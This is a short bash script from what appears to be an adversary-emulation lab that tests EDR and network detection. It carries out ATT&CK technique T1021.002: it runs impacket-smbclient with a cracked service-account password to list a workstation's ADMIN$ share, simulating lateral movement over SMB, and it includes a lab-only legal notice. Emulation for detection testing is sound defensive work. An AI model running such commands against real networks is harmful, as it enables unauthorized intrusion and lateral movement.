#!/usr/bin/env bash
# T1021.002 — Use cracked credential for lateral SMB access
# Derived verbatim from SIM-MP-002 step step-03 (../../mp-002-kerberoast-lateral-smb.yml).
# LEGAL: run only in an authorized, isolated lab. See ../README.md.
set -u -o pipefail
echo "[SIM-MP-002/T1021.002] Use cracked credential for lateral SMB access"

echo '[MP-002] EDR+NDR: Pass-the-Hash to workstation via SMB';
WS_IP="${CORTEXSIM_WS_IP:-10.0.10.20}";
DOMAIN="${CORTEXSIM_DOMAIN:-cortexsim.local}";
impacket-smbclient "$DOMAIN/sql-svc:Summer2024@$WS_IP" -c "ls \\\\ADMIN\$" 2>&1 | head -10 || echo '[*] demo-mode';
echo '[*] Detections fire at multiple planes simultaneously'
